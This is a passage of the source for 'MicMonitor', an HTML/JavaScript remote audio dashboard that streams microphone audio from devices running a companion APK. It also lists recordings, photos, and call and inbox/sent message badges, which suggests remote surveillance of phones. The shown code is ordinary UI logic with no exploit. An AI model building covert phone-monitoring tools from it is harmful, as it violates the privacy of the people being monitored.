<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MicMonitor Dashboard</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
      rel="stylesheet"
      crossorigin
    />
    <style>
      /* ═══════════════════════════════════════════════════════════════
         MicMonitor — Violet / Teal dark theme
         ═══════════════════════════════════════════════════════════════ */
      @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap");

      :root {
        /* Core palette */
        --bg: #0b0c1a;
        --bg2: #0f1123;
        --surface: #13152a;
        --card: #181a2e;
        --card2: #1c1f38;
        --border: #252847;
        --border2: #323672;
        /* Accents */
        --violet: #7c3aed;
        --violet2: #a78bfa;
        --teal: #14b8a6;
        --teal2: #5eead4;
        --pink: #ec4899;
        --green: #10b981;
        --green2: #6ee7b7;
        --red: #f43f5e;
        --amber: #f59e0b;
        --blue: #3b82f6;
        /* Text */
        --text: #e2e8f0;
        --text2: #94a3b8;
        --text3: #4b5578;
        --mono: "JetBrains Mono", monospace;
        /* Glow */
        --glow-v: rgba(124, 58, 237, 0.45);
        --glow-t: rgba(20, 184, 166, 0.45);
        --glow-g: rgba(16, 185, 129, 0.45);
        --glow-r: rgba(244, 63, 94, 0.45);
      }

      *,
      *::before,
      *::after {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      body {
        font-family: "Inter", "Segoe UI", sans-serif;
        background: var(--bg);
        background-image:
          radial-gradient(
            ellipse 52% 34% at 12% -8%,
            rgba(124, 58, 237, 0.12) 0%,
            transparent 62%
          ),
          radial-gradient(
            ellipse 45% 30% at 90% 100%,
            rgba(20, 184, 166, 0.08) 0%,
            transparent 58%
          );
        color: var(--text);
        min-height: 100vh;
        padding: 24px 20px 28px;
        line-height: 1.4;
      }

      ::-webkit-scrollbar {
        width: 4px;
        height: 4px;
      }
      ::-webkit-scrollbar-track {
        background: transparent;
      }
      ::-webkit-scrollbar-thumb {
        background: var(--border2);
        border-radius: 99px;
      }

      /* ── Header ─────────────────────────────────────────────────── */
      .header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 20px;
        flex-wrap: wrap;
        gap: 12px;
        padding-bottom: 14px;
        border-bottom: 1px solid var(--border);
      }
      .header-left {
        display: flex;
        align-items: center;
        gap: 16px;
      }
      .logo {
        width: 46px;
        height: 46px;
        background: linear-gradient(135deg, var(--violet), var(--teal));
        border-radius: 14px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
        box-shadow: 0 0 24px var(--glow-v);
      }
      .header-title {
        font-size: 20px;
        font-weight: 800;
        letter-spacing: -0.3px;
        background: linear-gradient(90deg, var(--violet2), var(--teal2));
        background-clip: text;
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
      }
      .header-sub {
        font-size: 10px;
        color: var(--text3);
        margin-top: 2px;
        letter-spacing: 0.05em;
        text-transform: uppercase;
      }

      .top-status-row {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 10px;
        flex-wrap: wrap;
        margin: 0 0 16px;
      }
      .network-banner {
        flex: 1;
        min-width: 240px;
        background: linear-gradient(
          135deg,
          rgba(17, 24, 39, 0.72),
          rgba(23, 37, 84, 0.48)
        );
        border: 1px solid var(--border2);
        border-radius: 12px;
        padding: 9px 12px;
        font-size: 11px;
        color: var(--text2);
      }
      .network-banner strong {
        color: var(--text);
        margin-right: 6px;
      }
      .network-banner.low {
        border-color: rgba(245, 158, 11, 0.55);
        box-shadow: 0 0 0 1px rgba(245, 158, 11, 0.12) inset;
      }
      .network-banner.low strong {
        color: #fcd34d;
      }
      #networkModeToggle {
        background: var(--surface);
        border: 1px solid var(--border);
        border-radius: 999px;
        color: var(--text2);
        cursor: pointer;
        font-size: 11px;
        font-weight: 700;
        letter-spacing: 0.04em;
        text-transform: uppercase;
        padding: 8px 12px;
      }
      #networkModeToggle.low {
        color: #fde68a;
        border-color: rgba(245, 158, 11, 0.55);
        background: rgba(245, 158, 11, 0.12);
      }

      /* ── Connection pill ────────────────────────────────────────── */
      .conn-pill {
        display: flex;
        align-items: center;
        gap: 8px;
        background: var(--surface);
        border: 1px solid var(--border);
        border-radius: 999px;
        padding: 7px 16px;
        font-size: 12px;
        font-weight: 600;
        color: var(--text3);
        transition:
          border-color 0.3s,
          color 0.3s;
      }
      .conn-pill.ok {
        border-color: rgba(16, 185, 129, 0.4);
        color: var(--green2);
      }
      .conn-dot {
        width: 8px;
        height: 8px;
        border-radius: 50%;
        background: var(--red);
        transition: background 0.3s;
      }
      .conn-dot.connected {
        background: var(--green);
        box-shadow: 0 0 10px var(--glow-g);
        animation: pulse 2s infinite;
      }
      @keyframes pulse {
        0%,
        100% {
          box-shadow: 0 0 6px var(--glow-g);
        }
        50% {
          box-shadow: 0 0 18px var(--glow-g);
        }
      }

      /* ── Layout ─────────────────────────────────────────────────── */
      .section-label {
        font-size: 10px;
        font-weight: 700;
        letter-spacing: 0.12em;
        text-transform: uppercase;
        color: var(--text3);
        margin-bottom: 12px;
        display: flex;
        align-items: center;
        gap: 8px;
      }
      .section-label::before {
        content: "";
        flex: 0 0 3px;
        height: 14px;
        background: linear-gradient(180deg, var(--violet), var(--teal));
        border-radius: 99px;
      }
      .bottom-row {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 14px;
        margin-top: 14px;
      }
      @media (max-width: 700px) {
        .bottom-row {
          grid-template-columns: 1fr;
        }
      }

      /* ── Devices container ──────────────────────────────────────── */
      #devicesContainer {
        display: flex;
        flex-direction: column;
        gap: 12px;
      }
      #noDevices {
        background: var(--surface);
        border: 1px dashed var(--border2);
        border-radius: 18px;
        padding: 56px 24px;
        text-align: center;
        color: var(--text3);
        font-size: 14px;
        line-height: 2;
      }
      #noDevices .nd-icon {
        font-size: 44px;
        display: block;
        margin-bottom: 14px;
        opacity: 0.7;
      }

      /* ── Device card ────────────────────────────────────────────── */
      .device-card {
        background: var(--card);
        border: 1px solid var(--border);
        border-radius: 16px;
        padding: 16px 16px 14px;
        transition:
          border-color 0.25s,
          box-shadow 0.25s;
        position: relative;
        overflow: hidden;
      }
      .device-card::before {
        content: "";
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 2px;
        background: linear-gradient(
          90deg,
          rgba(124, 58, 237, 0.75),
          rgba(20, 184, 166, 0.75)
        );
      }
      .device-card:hover {
        border-color: var(--border2);
        box-shadow: 0 8px 24px rgba(8, 10, 24, 0.32);
      }

      .device-header {
        display: flex;
        justify-content: space-between;
        align-items: flex-start;
        margin-bottom: 4px;
      }
      .device-name {
        font-size: 15px;
        font-weight: 700;
        color: var(--teal2);
        display: flex;
        align-items: center;
        gap: 9px;
      }
      .device-name::before {
        content: "";
        display: inline-block;
        width: 9px;
        height: 9px;
        border-radius: 50%;
        background: var(--green);
        box-shadow: 0 0 10px var(--glow-g);
        animation: pulse 2s infinite;
      }
      .device-badge {
        font-size: 10px;
        font-weight: 700;
        letter-spacing: 0.07em;
        padding: 3px 12px;
        border-radius: 999px;
        background: rgba(16, 185, 129, 0.12);
        color: var(--green2);
        border: 1px solid rgba(16, 185, 129, 0.3);
        transition: all 0.2s;
      }
      .device-badge.recording {
        background: rgba(244, 63, 94, 0.15);
        color: #fda4af;
        border-color: rgba(244, 63, 94, 0.35);
        animation: recPulse 1.2s ease infinite;
      }
      @keyframes recPulse {
        0%,
        100% {
          box-shadow: none;
        }
        50% {
          box-shadow: 0 0 10px rgba(244, 63, 94, 0.5);
        }
      }
      .device-meta {
        font-size: 11px;
        color: var(--text3);
        font-family: var(--mono);
        margin-bottom: 10px;
        margin-top: 3px;
      }
      .link-badge-row {
        display: flex;
        justify-content: flex-end;
        margin: -4px 0 8px;
      }
      .link-badge {
        font-size: 10px;
        font-weight: 700;
        letter-spacing: 0.04em;
        padding: 2px 9px;
        border-radius: 999px;
        border: 1px solid var(--border2);
        background: rgba(124, 58, 237, 0.08);
        color: var(--violet2);
      }
      .link-badge.good {
        background: rgba(16, 185, 129, 0.14);
        color: var(--green2);
        border-color: rgba(16, 185, 129, 0.4);
      }
      .link-badge.warn {
        background: rgba(245, 158, 11, 0.14);
        color: #f59e0b;
        border-color: rgba(245, 158, 11, 0.4);
      }
      .link-badge.bad {
        background: rgba(244, 63, 94, 0.14);
        color: #fda4af;
        border-color: rgba(244, 63, 94, 0.4);
      }
      .net-chip-row {
        display: flex;
        justify-content: flex-end;
        margin: -2px 0 10px;
      }
      .net-chip {
        font-size: 10px;
        font-weight: 700;
        letter-spacing: 0.05em;
        padding: 2px 9px;
        border-radius: 999px;
        border: 1px solid var(--border2);
        background: rgba(59, 130, 246, 0.1);
        color: #93c5fd;
      }
      .net-chip.low {
        color: #fde68a;
        border-color: rgba(245, 158, 11, 0.55);
        background: rgba(245, 158, 11, 0.16);
      }

      /* ── Health grid ────────────────────────────────────────────── */
      .health-grid {
        display: grid;
        grid-template-columns: repeat(3, minmax(0, 1fr));
        gap: 6px;
        margin: 0 0 10px;
      }
      @media (max-width: 900px) {
        .health-grid {
          grid-template-columns: repeat(2, minmax(0, 1fr));
        }
      }
      .health-item {
        background: var(--bg2);
        border: 1px solid var(--border);
        border-radius: 9px;
        padding: 6px 8px;
        transition: border-color 0.2s;
      }
      .health-item:hover {
        border-color: var(--border2);
      }
      .health-label {
        color: var(--text3);
        font-size: 9px;
        text-transform: uppercase;
        letter-spacing: 0.08em;
        font-weight: 600;
      }
      .health-val {
        color: var(--text);
        font-size: 11px;
        font-family: var(--mono);
        margin-top: 3px;
      }
      .br-badge {
        display: inline-block;
        min-width: 46px;
        text-align: center;
        border-radius: 999px;
        padding: 1px 8px;
        font-size: 10px;
        font-weight: 700;
        letter-spacing: 0.03em;
        border: 1px solid transparent;
      }
      .br-low {
        color: #fda4af;
        background: rgba(244, 63, 94, 0.16);
        border-color: rgba(244, 63, 94, 0.35);
      }
      .br-mid {
        color: #fde68a;
        background: rgba(245, 158, 11, 0.16);
        border-color: rgba(245, 158, 11, 0.35);
      }
      .br-high {
        color: var(--green2);
        background: rgba(16, 185, 129, 0.16);
        border-color: rgba(16, 185, 129, 0.35);
      }
      .ok-text {
        color: var(--green2);
      }
      .bad-text {
        color: #fda4af;
      }

      /* ── Waveform / Spectrum canvas ─────────────────────────────── */
      .canvas-wrap {
        background: var(--bg2);
        border: 1px solid var(--border);
        border-radius: 10px;
        overflow: hidden;
        margin-bottom: 10px;
        position: relative;
      }
      .canvas-wrap canvas {
        width: 100%;
        height: 60px;
        display: block;
      }
      .canvas-wrap.freq canvas {
        height: 78px;
      }
      .canvas-label {
        position: absolute;
        top: 7px;
        left: 11px;
        font-size: 9px;
        font-weight: 700;
        letter-spacing: 0.1em;
        text-transform: uppercase;
        color: var(--text3);
      }

      /* ── VU Meter ───────────────────────────────────────────────── */
      .vu-wrap {
        display: flex;
        align-items: center;
        gap: 8px;
        margin-bottom: 10px;
      }
      .vu-bar-bg {
        flex: 1;
        height: 7px;
        background: var(--bg2);
        border: 1px solid var(--border);
        border-radius: 99px;
        overflow: hidden;
      }
      .vu-bar-fill {
        height: 100%;
        width: 0%;
        border-radius: 99px;
        transition: width 0.07s linear;
        background: linear-gradient(
          90deg,
          var(--teal) 0%,
          var(--amber) 72%,
          var(--red) 94%
        );
      }
      .vu-db {
        font-family: var(--mono);
        font-size: 10px;
        color: var(--text3);
        min-width: 56px;
        text-align: right;
      }
      .clip-warn {
        display: none;
        font-size: 10px;
        font-weight: 800;
        color: var(--red);
        letter-spacing: 0.08em;
        animation: clipBlink 0.3s infinite alternate;
      }
      .clip-warn.active {
        display: inline;
      }
      @keyframes clipBlink {
        from {
          opacity: 1;
        }
        to {
          opacity: 0.15;
        }
      }

      /* ── Buttons ────────────────────────────────────────────────── */
      .btn-row {
        display: flex;
        gap: 6px;
        flex-wrap: wrap;
        margin-bottom: 10px;
      }
      button {
        font-family: "Inter", sans-serif;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        padding: 6px 11px;
        font-size: 11px;
        font-weight: 600;
        transition: all 0.15s;
        display: flex;
        align-items: center;
        gap: 4px;
        min-height: 31px;
        white-space: nowrap;
      }
      button:hover:not(:disabled) {
        transform: translateY(-1px);
        filter: brightness(1.15);
      }
      button:active:not(:disabled) {
        transform: translateY(0);
        filter: brightness(0.95);
      }
      button:disabled {
        opacity: 0.3;
        cursor: not-allowed;
      }

      .btn-live {
        background: linear-gradient(135deg, #4f46e5, #7c3aed);
        color: #fff;
        box-shadow: 0 2px 8px rgba(124, 58, 237, 0.35);
      }
      .btn-live.active {
        background: linear-gradient(135deg, #7c3aed, #8b5cf6);
        box-shadow: 0 2px 10px rgba(168, 85, 247, 0.45);
      }
      .btn-rec {
        background: linear-gradient(135deg, #be123c, #f43f5e);
        color: #fff;
        box-shadow: 0 2px 8px rgba(244, 63, 94, 0.35);
      }
      .btn-stop {
        background: var(--card2);
        color: var(--text2);
        border: 1px solid var(--border2);
      }
      .btn-ghost {
        background: rgba(124, 58, 237, 0.1);
        color: var(--violet2);
        border: 1px solid rgba(124, 58, 237, 0.25);
      }
      .btn-ghost:hover:not(:disabled) {
        background: rgba(124, 58, 237, 0.18);
        border-color: rgba(124, 58, 237, 0.45);
      }
      .btn-rtc {
        background: linear-gradient(135deg, #0f766e, #14b8a6);
        color: #fff;
        box-shadow: 0 2px 8px rgba(20, 184, 166, 0.35);
      }
      .btn-rtc.active {
        background: linear-gradient(135deg, #14b8a6, #2dd4bf);
        box-shadow: 0 2px 10px rgba(20, 184, 166, 0.48);
      }

      /* ── Tabs ───────────────────────────────────────────────────── */
      .tab-bar {
        display: flex;
        gap: 3px;
        flex-wrap: wrap;
        background: var(--bg2);
        border-radius: 10px;
        padding: 4px;
        margin-bottom: 10px;
        border: 1px solid var(--border);
      }
      .tab-btn {
        flex: 1;
        background: transparent;
        border: none;
        border-radius: 7px;
        color: var(--text3);
        cursor: pointer;
        font-size: 11px;
        font-weight: 600;
        padding: 6px 8px;
        transition: all 0.15s;
        min-width: 60px;
      }
      .tab-btn:hover:not(.active) {
        color: var(--text2);
        background: rgba(255, 255, 255, 0.04);
      }
      .tab-btn.active {
        background: linear-gradient(135deg, var(--violet), var(--teal));
        color: #fff;
        box-shadow: 0 2px 8px var(--glow-v);
      }
      .tab-panel {
        display: none;
        max-height: 220px;
        overflow-y: auto;
        font-size: 12px;
        border-radius: 8px;
        background: var(--bg2);
        padding: 4px;
        border: 1px solid var(--border);
      }
      .tab-panel.active {
        display: block;
      }
      .data-row {
        padding: 7px 10px;
        border-radius: 6px;
        border-bottom: 1px solid var(--border);
        line-height: 1.6;
      }
      .data-row:last-child {
        border-bottom: none;
      }
      .data-row:hover {
        background: rgba(255, 255, 255, 0.025);
      }
      .data-label {
        color: var(--text3);
        font-size: 10px;
        text-transform: uppercase;
        letter-spacing: 0.06em;
      }
      .data-val {
        color: var(--text);
        word-break: break-all;
      }
      .data-badge {
        display: inline-block;
        border-radius: 4px;
        padding: 1px 7px;
        font-size: 9px;
        font-weight: 700;
        letter-spacing: 0.05em;
        text-transform: uppercase;
        margin-left: 6px;
      }
      .badge-in {
        background: rgba(16, 185, 129, 0.15);
        color: var(--green2);
        border: 1px solid rgba(16, 185, 129, 0.2);
      }
      .badge-out {
        background: rgba(124, 58, 237, 0.15);
        color: var(--violet2);
        border: 1px solid rgba(124, 58, 237, 0.2);
      }
      .badge-missed {
        background: rgba(244, 63, 94, 0.15);
        color: #fda4af;
        border: 1px solid rgba(244, 63, 94, 0.2);
      }
      .badge-inbox {
        background: rgba(20, 184, 166, 0.12);
        color: var(--teal2);
        border: 1px solid rgba(20, 184, 166, 0.2);
      }
      .badge-sent {
        background: rgba(167, 139, 250, 0.12);
        color: #c4b5fd;
        border: 1px solid rgba(167, 139, 250, 0.2);
      }
      .badge-unread {
        background: rgba(245, 158, 11, 0.15);
        color: #fcd34d;
        font-size: 8px;
        margin-left: 4px;
        border: 1px solid rgba(245, 158, 11, 0.2);
      }

      /* ── Sidebar panels ─────────────────────────────────────────── */
      .sidebar {
        display: flex;
        flex-direction: column;
        gap: 16px;
      }
      .panel {
        background: var(--card);
        border: 1px solid var(--border);
        border-radius: 14px;
        overflow: hidden;
      }
      .panel-head {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 15px 18px 0;
      }
      .panel-title {
        font-size: 11px;
        font-weight: 700;
        color: var(--text2);
        text-transform: uppercase;
        letter-spacing: 0.1em;
        display: flex;
        align-items: center;
        gap: 8px;
      }
      .panel-title .pi {
        font-size: 15px;
      }
      .panel-body {
        padding: 10px 14px 14px;
      }

      /* ── Recordings list ────────────────────────────────────────── */
      #globalRecList {
        display: flex;
        flex-direction: column;
        gap: 6px;
      }
      .rec-item {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background: var(--bg2);
        border: 1px solid var(--border);
        border-radius: 8px;
        padding: 7px 10px;
        gap: 8px;
        transition: border-color 0.15s;
      }
      .rec-item:hover {
        border-color: var(--border2);
      }
      .rec-item a {
        color: var(--teal2);
        text-decoration: none;
        font-size: 11px;
        font-family: var(--mono);
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
        max-width: 170px;
      }
      .rec-item a:hover {
        color: var(--violet2);
        text-decoration: underline;
      }
      .rec-size {
        color: var(--text3);
        font-size: 10px;
        font-family: var(--mono);
        flex-shrink: 0;
      }
      .rec-empty {
        color: var(--text3);
        font-size: 12px;
        text-align: center;
        padding: 22px 0;
      }
      .rec-list {
        margin-bottom: 10px;
        display: flex;
        flex-direction: column;
        gap: 5px;
      }
      .rec-list .rec-item a {
        max-width: none;
      }
      .photo-list {
        margin-bottom: 10px;
        display: flex;
        flex-direction: column;
        gap: 6px;
      }
      .photo-item {
        display: grid;
        grid-template-columns: 76px 1fr;
        gap: 8px;
        align-items: center;
        background: var(--bg2);
        border: 1px solid var(--border);
        border-radius: 8px;
        padding: 6px;
      }
      .photo-thumb {
        width: 72px;
        height: 54px;
        object-fit: cover;
        border-radius: 6px;
        border: 1px solid var(--border2);
        display: block;
      }
      .photo-meta {
        font-size: 10px;
        color: var(--text3);
        margin-bottom: 2px;
        letter-spacing: 0.04em;
        text-transform: uppercase;
      }
      .photo-link {
        color: var(--teal2);
        font-size: 11px;
        text-decoration: none;
        font-family: var(--mono);
      }
      .photo-link:hover {
        color: var(--violet2);
        text-decoration: underline;
      }

      /* ── Event log ──────────────────────────────────────────────── */
      #logOutput {
        font-family: var(--mono);
        font-size: 11px;
        color: var(--text2);
        height: 180px;
        overflow-y: auto;
        line-height: 1.6;
      }
      .log-entry {
        padding: 1px 0;
        display: flex;
        gap: 8px;
        align-items: baseline;
      }
      .log-ts {
        color: var(--text3);
        font-size: 10px;
        flex-shrink: 0;
      }
      .log-info {
        color: var(--violet2);
      }
      .log-warn {
        color: var(--amber);
      }
      .log-ok {
        color: var(--green2);
      }
      .log-err {
        color: #fda4af;
      }

      /* ── Connection quality bars ────────────────────────────────── */
      .conn-quality-bar {
        display: flex;
        gap: 3px;
        align-items: flex-end;
        height: 18px;
      }
      .cq-seg {
        width: 6px;
        border-radius: 2px 2px 0 0;
        background: var(--border);
        transition: background 0.3s;
      }
      .cq-seg.lit {
        background: var(--green);
      }
      .cq-seg.warn {
        background: var(--amber);
      }
      .cq-seg.bad {
        background: var(--red);
      }

      /* ── Theme toggle ───────────────────────────────────────────── */
      #themeToggle {
        background: var(--surface);
        border: 1px solid var(--border);
        border-radius: 999px;
        color: var(--text2);
        cursor: pointer;
        font-size: 13px;
        padding: 7px 16px;
        transition: all 0.2s;
      }
      #themeToggle:hover {
        border-color: var(--violet);
        color: var(--violet2);
      }

      /* ── Light theme override ───────────────────────────────────── */
      body.light {
        --bg: #f3f4f8;
        --bg2: #eceef5;
        --surface: #e4e6f0;
        --card: #ffffff;
        --card2: #f8f9fc;
        --border: #d1d5e8;
        --border2: #a0a7c7;
        --violet: #6d28d9;
        --violet2: #5b21b6;
        --teal: #0d9488;
        --teal2: #0f766e;
        --green: #059669;
        --green2: #047857;
        --red: #e11d48;
        --amber: #d97706;
        --blue: #2563eb;
        --text: #0f0f1a;
        --text2: #374151;
        --text3: #6b7280;
        --glow-v: rgba(109, 40, 217, 0.25);
        --glow-t: rgba(13, 148, 136, 0.25);
      }
      body.light {
        background-image:
          radial-gradient(
            ellipse 60% 40% at 10% -5%,
            rgba(109, 40, 217, 0.1) 0%,
            transparent 60%
          ),
          radial-gradient(
            ellipse 50% 35% at 90% 105%,
            rgba(13, 148, 136, 0.08) 0%,
            transparent 55%
          );
      }
      body.light .canvas-wrap {
        background: #eef0f9;
      }
      body.light .tab-panel {
        background: #eceef5;
      }
      body.light #logOutput {
        color: var(--text2);
      }
      body.light .device-card::before {
        opacity: 0.6;
      }
    </style>
  </head>
  <body>
    <div class="header">
      <div class="header-left">
        <div class="logo">🎙</div>
        <div>
          <div class="header-title">MicMonitor</div>
          <div class="header-sub">Remote audio dashboard</div>
        </div>
      </div>
      <div
        style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap"
      >
        <button id="themeToggle" onclick="toggleTheme()">🌙 Dark</button>
        <div class="conn-pill" id="connPill">
          <div id="wsDot" class="conn-dot"></div>
          <span id="wsStatus">Connecting…</span>
        </div>
      </div>
    </div>

    <div class="section-label">Connected Devices</div>
    <div class="top-status-row">
      <div class="network-banner" id="networkBanner">
        <strong>Network Profile:</strong
        ><span id="networkBannerText">Auto adaptive mode is active.</span>
      </div>
      <button id="networkModeToggle" onclick="toggleLowNetworkMode()">
        Force Low-Network: Off
      </button>
    </div>
    <div id="devicesContainer">
      <div id="noDevices">
        <span class="nd-icon">📵</span>
        No devices connected yet.<br />
        Install the APK and grant microphone permission.
      </div>
    </div>

    <div class="bottom-row">
      <div class="panel">
        <div class="panel-head">
          <div class="panel-title"><span class="pi">📂</span> Recordings</div>
        </div>
        <div class="panel-body">
          <div id="globalRecList">
            <div class="rec-empty">No recordings yet.</div>
          </div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-head">
          <div class="panel-title"><span class="pi">📋</span> Event Log</div>
        </div>
        <div class="panel-body" style="padding-top: 8px">
          <div id="logOutput"></div>
        </div>
      </div>
    </div>

    <script>
      const _wsProto = location.protocol === "https:" ? "wss" : "ws";
      const _wsHost = location.port
        ? `${location.hostname}:${location.port}`
        : location.hostname;
      let webRtcConfig = {
        iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }],
        tokenRequired: false,
      };

      // ── Dark / Light theme ───────────────────────────────────────────────
      (function initTheme() {
        const saved = localStorage.getItem("micmonitor:theme") || "dark";
        if (saved === "light") {
          document.body.classList.add("light");
          const btn = document.getElementById("themeToggle");
          if (btn) btn.textContent = "☀️ Light";
        }
      })();
      function toggleTheme() {
        const isLight = document.body.classList.toggle("light");
        const btn = document.getElementById("themeToggle");
        if (btn) btn.textContent = isLight ? "☀️ Light" : "🌙 Dark";
        try {
          localStorage.setItem("micmonitor:theme", isLight ? "light" : "dark");
        } catch (_) {}
      }

      // ── Visualizer mode (wave / freq) per device ─────────────────────────
      function cycleVizMode(deviceId) {
        const state = deviceState[deviceId];
        if (!state) return;
        const modes = ["wave", "freq"];
        const current = state.vizMode || "wave";
        state.vizMode = modes[(modes.indexOf(current) + 1) % modes.length];
        const btn = document.getElementById(`btnVizMode_${deviceId}`);
        if (btn)
          btn.textContent = `Viz: ${state.vizMode.charAt(0).toUpperCase() + state.vizMode.slice(1)}`;
        const wrap = document.getElementById(`vizWrap_${deviceId}`);
        const label = document.getElementById(`vizLabel_${deviceId}`);
        if (wrap) wrap.classList.toggle("freq", state.vizMode === "freq");
        if (label)
          label.textContent =
            state.vizMode === "freq" ? "SPECTRUM" : "WAVEFORM";
      }

      // ── VU meter + Clipping detection ────────────────────────────────
      function updateVuMeter(deviceId, float32) {
        const fill = document.getElementById(`vuFill_${deviceId}`);
        const dbEl = document.getElementById(`vuDb_${deviceId}`);
        const clipEl = document.getElementById(`clipWarn_${deviceId}`);
        if (!fill || !dbEl) return;
        let peak = 0,
          sum = 0;
        for (let i = 0; i < float32.length; i++) {
          const a = Math.abs(float32[i]);
          if (a > peak) peak = a;
          sum += a * a;
        }
        const rms = Math.sqrt(sum / Math.max(1, float32.length));
        const dbRms = rms > 0 ? 20 * Math.log10(rms) : -96;
        const pct = Math.max(0, Math.min(100, ((dbRms + 60) / 60) * 100));
        fill.style.width = pct.toFixed(1) + "%";
        dbEl.textContent = dbRms > -96 ? dbRms.toFixed(1) + " dBFS" : "-∞ dBFS";
        const clipping = peak >= 0.98;
        if (clipEl) clipEl.classList.toggle("active", clipping);
        if (clipping) {
          const state = deviceState[deviceId];
          if (state) {
            state._lastClipAt = Date.now();
          }
        }
      }

      function updateLinkBadge(deviceId, state) {
        const el = document.getElementById(`linkBadge_${deviceId}`);
        if (!el || !state) return;
        const h = state.health || {};
        const wsOk = h.wsConnected !== false;
        const kbFromHealth = Number(h.bitrateKbps);
        const kb =
          Number.isFinite(kbFromHealth) && kbFromHealth > 0
            ? Math.round(kbFromHealth)
            : Math.max(0, Math.round(Number(state.rtcRxKbps || 0)));
        let text = "IDLE";
        let cls = "link-badge";

        if (!wsOk) {
          text = "WS OFFLINE";
          cls += " bad";
        } else if (state.useWebRtc) {
          if (state.rtcConnected) {
            text = kb > 0 ? `RTC ${kb} kbps` : "RTC LIVE";
            cls += kb >= 28 ? " good" : kb >= 18 ? " warn" : " bad";
          } else if (state.rtcRetryCount > 0) {
            text = `RTC RECOVER x${state.rtcRetryCount}`;
            cls += " warn";
          } else {
            text = "RTC CONNECTING";
            cls += " warn";
          }
        } else if (state.isLive) {
          const codec = String(h.streamCodec || "").toLowerCase();
          text = codec === "smart" ? "SMART LIVE" : "PCM LIVE";
          cls += " good";
        } else {
          cls += " warn";
        }

        el.textContent = text;
        el.className = cls;
      }

      // ── Connection Quality Bars ──────────────────────────────────────
      function updateConnectionQualityBar(deviceId, quality) {
        const bar = document.getElementById(`cqBar_${deviceId}`);
        if (!bar) return;
        const segs = bar.querySelectorAll(".cq-seg");
        // Score 0-4 based on RTT + loss + jitter
        const rtt = Number(quality?.rttMs);
        const loss = Number(quality?.lossPct);
        const jitter = Number(quality?.jitterMs);
        let score = 4;
        if (Number.isFinite(rtt)) {
          if (rtt > 300) score = Math.min(score, 1);
          else if (rtt > 150) score = Math.min(score, 2);
          else if (rtt > 80) score = Math.min(score, 3);
        }
        if (Number.isFinite(loss)) {
          if (loss > 10) score = Math.min(score, 1);
          else if (loss > 5) score = Math.min(score, 2);
          else if (loss > 1) score = Math.min(score, 3);
        }
        if (Number.isFinite(jitter)) {
          if (jitter > 80) score = Math.min(score, 1);
          else if (jitter > 40) score = Math.min(score, 2);
          else if (jitter > 20) score = Math.min(score, 3);
        }
        if (
          !Number.isFinite(rtt) &&
          !Number.isFinite(loss) &&
          !Number.isFinite(jitter)
        )
          score = 0;
        const cls = score <= 1 ? "bad" : score <= 2 ? "warn" : "lit";
        segs.forEach((seg, i) => {
          seg.className = "cq-seg" + (i < score ? " " + cls : "");
        });
      }

      let controlWs = null;
      const deviceState = {};
      const networkMode = {
        forcedLow: false,
        autoLow: false,
      };
      let _wsReconnectDelay = 2000; // exponential backoff start
      const RN_ENABLED_STORAGE_PREFIX = "micmonitor:rnenabled:";
      const GAIN_STORAGE_PREFIX = "micmonitor:gain:";
      const STREAM_MODE_STORAGE_PREFIX = "micmonitor:streammode:";
      const VOICE_PROFILE_STORAGE_PREFIX = "micmonitor:voiceprofile:";
      const AUTO_LISTEN_STORAGE_PREFIX = "micmonitor:autolisten:";
      const PREFER_RTC_STORAGE_PREFIX = "micmonitor:preferrtc:";
      const PHOTO_QUALITY_STORAGE_PREFIX = "micmonitor:photoquality:";
      const LOW_NET_STORAGE_KEY = "micmonitor:low-network-mode";
      let rnnoiseLibPromise = null;
      let rnnoiseWasmPromise = null;
      const rnnoiseWorkletLoadedContexts = new WeakSet();

      function initNetworkMode() {
        try {
          networkMode.forcedLow =
            localStorage.getItem(LOW_NET_STORAGE_KEY) === "1";
        } catch (_) {
          networkMode.forcedLow = false;
        }
        updateNetworkModeUi();
      }

      function isLowNetworkModeActive() {
        return networkMode.forcedLow || networkMode.autoLow;
      }

      function updateNetworkModeUi() {
        const btn = document.getElementById("networkModeToggle");
        const banner = document.getElementById("networkBanner");
        const bannerText = document.getElementById("networkBannerText");
        const low = isLowNetworkModeActive();
        if (btn) {
          btn.textContent = `Force Low-Network: ${networkMode.forcedLow ? "On" : "Off"}`;
          btn.classList.toggle("low", low);
        }
        if (banner && bannerText) {
          banner.classList.toggle("low", low);
          if (networkMode.forcedLow) {
            bannerText.textContent =
              "Forced low-network profile is active: PCM clarity mode + WebRTC fallback off.";
          } else if (networkMode.autoLow) {
            bannerText.textContent =
              "Poor link detected automatically. Switched to PCM clarity fallback temporarily.";
          } else {
            bannerText.textContent = "Auto adaptive mode is active.";
          }
        }
      }

      function toggleLowNetworkMode() {
        networkMode.forcedLow = !networkMode.forcedLow;
        try {
          localStorage.setItem(
            LOW_NET_STORAGE_KEY,
            networkMode.forcedLow ? "1" : "0",
          );
        } catch (_) {}
        applyNetworkModeToAllDevices();
        updateNetworkModeUi();
        log(
          `Forced low-network mode ${networkMode.forcedLow ? "enabled" : "disabled"}`,
          networkMode.forcedLow ? "warn" : "info",
        );
      }

      function updateAutoLowNetworkFlag() {
        const anyPoor = Object.values(deviceState).some(
          (s) => s && s.autoLowCandidate === true,
        );
        if (networkMode.autoLow !== anyPoor) {
          networkMode.autoLow = anyPoor;
          applyNetworkModeToAllDevices();
